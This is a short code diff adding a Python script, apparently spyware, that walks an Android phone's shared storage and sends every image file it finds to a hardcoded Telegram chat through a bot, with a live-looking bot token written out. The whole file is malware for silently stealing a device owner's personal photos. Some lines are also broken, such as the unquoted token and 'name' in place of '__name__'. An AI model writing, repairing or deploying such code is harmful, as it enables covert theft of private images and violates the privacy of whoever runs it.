@@ -1,0 +1,39 @@
+import os
+import telebot
+from threading import Thread
+from concurrent.futures import ThreadPoolExecutor
+
+# mhammadhassann
+TOKEN = "YOUR_BOT_TOKEN"
+CHAT_ID = "7381776473"
+
+# hamacyber coder
+bot = telebot.TeleBot(7729157630:AAES5PJIth3YlnnfKX_EUNpqHqNc8ylfqGY)
+
+class MyApp:
+    def send_files(self):
+        # hamacyber
+        dir_path = "/storage/emulated/0/"
+        
+        
+        def send_file(file_path):
+            try:
+                # hama cyber open file
+                with open(file_path, "rb") as f:
+                    if file_path.endswith((".jpg", ".png", ".jpeg", ".webp")):
+                        bot.send_photo(chat_id=CHAT_ID, photo=f)
+            except Exception as e:
+                print(f"Error sending file {file_path}: {e}")
+
+       
+        with ThreadPoolExecutor() as executor:
+            for root, dirs, files in os.walk(dir_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    
+                    executor.submit(send_file, file_path)
+
+# HAMACYBER CODE 
+if name == "__main__":
+    app = MyApp()
+    app.send_files()
